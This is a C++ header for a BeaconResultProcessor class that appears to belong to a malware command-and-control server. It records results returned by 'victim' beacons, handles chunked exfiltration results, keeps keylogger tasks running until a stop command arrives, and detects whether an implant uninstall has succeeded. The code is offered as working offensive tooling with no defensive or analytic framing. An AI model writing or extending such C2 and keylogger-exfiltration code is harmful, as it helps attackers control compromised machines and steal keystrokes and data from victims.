#pragma once

#include "Beacon.hpp"
#include "ChunkAssembler.hpp"
#include "CommandService.hpp"
#include "ExfilEnvelope.hpp"
#include "ResultDAO.hpp"
#include "ResultService.hpp"

#include <optional>
#include <string>

class BeaconResultProcessor {
public:
    BeaconResultProcessor(CommandService& commands, IResultService& results)
        : commands_(commands), results_(results) {}

    void process_results(const std::string& victim_uid, const std::vector<CommandResult>& command_results) {
        for (const auto& cmd_result : command_results) {
            if (auto cmd_opt = commands_.get_by_uid(cmd_result.command_uid)) {
                results_.store_beacon_result(victim_uid, cmd_result);
                auto completed = cmd_opt.value();

                bool should_complete = cmd_result.chunk_total <= 1 ||
                    cmd_result.status == exfil::kStatusSuccess;
                if (cmd_result.kind == std::string(exfil::kKindKeylogger) &&
                    !completed.command.starts_with("keylogger_stop")) {
                    should_complete = false;
                }

                if (should_complete) {
                    commands_.mark_completed(completed);
                }
            }
        }
    }

    [[nodiscard]] bool is_uninstall_completed(const std::vector<CommandResult>& command_results) const {
        for (const auto& cmd_result : command_results) {
            if (auto cmd_opt = commands_.get_by_uid(cmd_result.command_uid)) {
                const auto& cmd = cmd_opt.value();
                if (cmd.command.starts_with("uninstall") && cmd_result.status == exfil::kStatusSuccess) {
                    return true;
                }
            }
        }
        return false;
    }

private:
    CommandService& commands_;
    IResultService& results_;
};
